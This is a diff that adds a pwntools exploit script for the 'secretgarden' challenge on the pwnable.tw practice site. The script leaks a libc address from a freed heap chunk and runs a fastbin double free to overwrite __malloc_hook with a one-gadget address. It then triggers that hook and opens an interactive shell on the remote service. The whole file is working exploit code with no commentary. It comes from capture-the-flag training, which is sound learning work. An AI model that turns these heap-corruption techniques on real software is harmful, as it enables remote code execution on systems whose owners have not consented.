@@ -1,0 +1,65 @@
+#!/usr/bin/python3
+from pwn import *
+import os
+context(os='linux', arch='amd64', binary='./secretgarden')
+debug   = False 
+binary  = ELF("./secretgarden")
+lib     = ELF("./libc.so.6") 
+
+if debug:
+    env = {'LD_PRELOAD' :os.path.join(os.getcwd(), 'libc.so.6')}
+    p = process(["./ld-2.23.so", "./secretgarden"], env=env)
+    context.terminal = ['tmux', 'new-window']
+else:
+    p = remote("chall.pwnable.tw", 10203) 
+
+
+send_str = lambda s, ss : p.sendlineafter(s, ss)
+send_num = lambda s, num : p.sendlineafter(s, str(num).encode())
+
+
+def raise_fl(name_len, name, color):
+    send_num(b'choice : ', 1)
+    send_num(b'name :', name_len)
+    send_str(b'name of flower :', name)
+    send_str(b'color of the flower :', color)
+
+def show():
+    send_num(b'choice : ', 2)
+
+
+def remove_fl(idx):
+    send_num(b'choice : ', 3)
+    send_num(b'garden:', idx)
+
+def clean_gr():
+    send_num(b'choice : ', 4)
+
+
+
+raise_fl(500, b'a' * 8, b'a' * 8)
+raise_fl(500, b'a' * 8, b'a' * 8)
+raise_fl(500, b'a' * 8, b'a' * 8)
+
+remove_fl(1)
+raise_fl(400, b'a' * 7, b'a' * 8)
+show()
+p.recvuntil(b'flower[3] :aaaaaaa\n')
+heap_addr = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x58
+lib.address = heap_addr - 0x3c3b20
+log.info(f"heap address: 0x{heap_addr:x}")
+log.info(f"libc address: 0x{lib.address:x}")
+raise_fl(0x60, b'b' * 8, b'c' * 8)
+raise_fl(0x60, b'b' * 8, b'c' * 8)
+raise_fl(0x60, b'b' * 8, b'c' * 8)
+remove_fl(5)
+remove_fl(6)
+remove_fl(5)
+raise_fl(0x60, p64(lib.symbols['__malloc_hook'] - 0x23), b'c' * 8)
+raise_fl(0x60, b'b' * 8, b'c' * 8)
+raise_fl(0x60, b'b' * 8, b'c' * 8)
+raise_fl(0x60, b'\x00' * 0x13 + p64(lib.address + 0xef6c4) , b'c' * 8)
+remove_fl(8)
+remove_fl(8)
+p.interactive()
+
